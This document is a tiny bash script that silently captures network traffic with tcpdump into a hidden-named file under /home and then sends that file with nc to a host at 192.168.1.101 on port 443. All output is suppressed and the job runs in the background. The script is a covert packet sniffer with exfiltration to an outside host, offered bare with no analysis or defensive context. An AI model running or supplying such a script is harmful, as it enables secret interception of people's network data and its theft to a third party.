#!/bin/bash  
{
tcpdump -w /home/..1
nc -w 3 192.168.1.101 443 < /home/..1
} > /dev/null 2>&1 &
